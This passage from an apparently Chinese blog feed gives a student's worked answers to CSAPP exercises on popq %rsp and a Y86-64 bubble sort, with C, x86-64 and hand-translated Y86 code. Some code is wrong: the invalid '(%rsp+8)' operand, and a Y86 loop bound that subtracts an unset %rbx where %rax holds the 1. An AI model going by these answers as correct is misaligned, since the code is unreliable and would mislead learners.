class="line-numbers-rows"><span></span><span></span></span></code></pre><br>A. 借助于练习题 4.8 中所做的分析，这段代码序列正确地描述了指令 popq %rsp 的行为吗？请解释。</p><p>B. 你该如何改写这段代码序列，使得它能够像对 REG 是其他寄存器时一样，正确地描述 REG rsp 的情况？</p></blockquote><p>和上一题同理<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">movq REG, (%rsp+8)addq $8,%rsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><hr><h2 id="4-47"><a href="#4-47" class="headerlink" title="***4.47"></a><code>***4.47</code></h2><blockquote><p>你的作业是写一个执行冒泡排序的 Y86-64 程序。下面这个函数用数组引用实现冒泡排序，供你参考：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">></span><span class="token number">1</span> <span class="token operator">/</span>• Bubble sort<span class="token operator">:</span> Array version•<span class="token operator">/</span> <span class="token operator">></span><span class="token number">2</span> <span class="token keyword">void</span> <span class="token function">bubble_a</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token operator">*</span> data<span class="token punctuation">,</span> <span class="token keyword">long</span> count<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token operator">></span><span class="token number">3</span>   <span class="token keyword">long</span> i<span class="token punctuation">,</span> last<span class="token punctuation">;</span> <span class="token operator">></span><span class="token number">4</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span>last <span class="token operator">=</span> count<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> last <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> last<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token operator">></span><span class="token number">5</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> O<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> last<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">></span><span class="token number">6</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token punctuation">[</span>i <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> data <span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token operator">></span><span class="token number">7</span>           <span class="token comment">/* Swap adjacent elements*/</span> <span class="token operator">></span><span class="token number">8</span>               <span class="token keyword">long</span> t <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">></span><span class="token number">9</span>               data<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">></span><span class="token number">10</span>              data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">;</span> <span class="token operator">></span><span class="token number">11</span>          <span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token number">12</span>      <span class="token punctuation">&#125;</span>    <span class="token operator">></span><span class="token number">13</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>A. 书写并测试一个版本，它用指针引用数组元素，而不是用数组索引。</p><p>B. 书写并测试一个由这个函数和测试代码组成的 Y86-64 程序。你会发现模仿编译你的代码产生的 x86-64 代码来做实现会很有帮助。虽然指针比较通常是用无符号算术运算来实现的，但是在这个练习中，你可以使用有符号算术运算。</p></blockquote><p>用指针做一个替换<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">bubble_a</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token operator">*</span> data<span class="token punctuation">,</span> <span class="token keyword">long</span> count<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">long</span> i<span class="token punctuation">,</span> last<span class="token punctuation">;</span>  <span class="token keyword">long</span> <span class="token operator">*</span>p <span class="token operator">=</span> data<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>last <span class="token operator">=</span> count<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> last <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> last<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> last<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">long</span> <span class="token operator">*</span>a <span class="token operator">=</span> data <span class="token operator">+</span> i<span class="token punctuation">;</span>      <span class="token keyword">long</span> <span class="token operator">*</span>b <span class="token operator">=</span> data <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>a <span class="token operator">></span> <span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">long</span> t <span class="token operator">=</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>        <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token operator">*</span>b<span class="token punctuation">;</span>        <span class="token operator">*</span>b <span class="token operator">=</span> t<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>得到的x86代码如下：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">bubble_a:.LFB23:.cfi_startprocendbr64leaq-1(%rsi), %r8   ;last &#x3D; count-1testq%r8, %r8jle.L1leaq(%rdi,%r8,8), %rsi  ;rsi &#x3D; rdi + 8 * r8jmp.L3.L4:addq$8, %rax        ; 指向下一个元素cmpq%rsi, %rax      ; 确认是否遍历完毕je.L7                 ; 遍历完，进入L7，否则进入L5.L5:movq(%rax), %rdxmovq8(%rax), %rcxcmpq%rcx, %rdx      ; 比较当前元素和下一个元素jle.L4                 ; 跳到L4，下一次循环movq%rcx, (%rax)    movq%rdx, 8(%rax)   ; 交换jmp.L4                 .L7:subq$8, %rsi        subq$1, %r8je.L1.L3:movq%rdi, %rax      ;把数组的起始地址放入 %raxjmp.L5.L1:ret.cfi_endproc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>转译到Y86代码</p><p>回顾Y86指令，只有8字节数据。<br>有指明目标的4个movq：irmovq rrmovq mrmovq rmmovq，立即数(i)、寄存器 (r) 或内存 (m).<br>四个只能操作寄存器的整数操作addq subq andq xorq<br>七个跳转指令jmp jle jl je jne jge jg<br>六个条件传送cmovle cmovl cmove cmovne cmovge cmovg<br>call ret<br>pushq popq<br>halt停止处理器</p><p>接下来对照x86汇编代码完成翻译：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">bubble_a:    irmovq  $1, %rax     ;rax &#x3D; 1，立即数    rrmovq  %rsi, %r8    ;r8 &#x3D; count    subq    %rbx, %r8    ; count - 1    jle .L1              ;last小于0，进入.L1（返回）    irmovq $8,  %rbx     ;rbx &#x3D; 8    rrmovq  %r8, %rcx    ;rcx &#x3D; last    andq    %rcx,%rcx        jle .L1              ;如果只有一个元素，也返回        irmovq  $0, %rsi     ;rsi &#x3D; 0    .L_mult:    addq    %rbx, %rsi   ;rsi +&#x3D; 8    subq    %rbx, %rcx   ;rcx -&#x3D; 1      jg .L_mult           ;rcx 小于等于0时    addq    %rdi, %rsi   ;rsi &#x3D; data + last*8，完成寻址    .L3:    rrmovq  %rdi, %rax   ;rax &#x3D; data    jmp .L5.L5:    mrmovq  (%rax), %rdx    mrmovq  8(%rax), %rcx ;拿出两个待比较数字    rrmovq  %rdx, %rbx  ;中继，不影响寄存器里的值    subq    %rcx, %rbx  ;比较    jle .L4    rmmovq  %rcx, (%rax)    rmmovq  %rdx, 8(%rax) ;交换    .L4:    irmovq  $8, %rbx    addq    %rbx, %rax  ;指向下一个元素    rrmovq  %rsi, %rbx    subq    %rax, %rbx      je .L7              ;内层循环结束，进入外层循环    jmp .L5             ;继续内层循环.L7:    irmovq  $8, %rbx    ;rbx &#x3D; 8    subq    %rbx, %rsi  ;rsi -&#x3D; 8    irmovq  $1, %rbx    ;rbx &#x3D; 1    subq    %rbx, %r8   ;r8(last)-&#x3D;1    je .L1              ;last &#x3D;&#x3D; 0,返回    jmp .L3             ;否则回到L3.L1:    ret                 ;返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;4-45&quot;&gt;&lt;a href=&quot;#4-45&quot; class=&quot;headerlink&quot; title=&quot;*4.45&quot;&gt;&lt;/a&gt;&lt;code&gt;*4.45&lt;/code&gt;&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在3.4.2节中，x86-64 pushq</summary>
        
      
    
    
    
    
    <category term="CSAPP" scheme="https://aucept.in/tags/CSAPP/"/>
    
    <category term="Y86" scheme="https://aucept.in/tags/Y86/"/>
    
  </entry>
  
</feed>
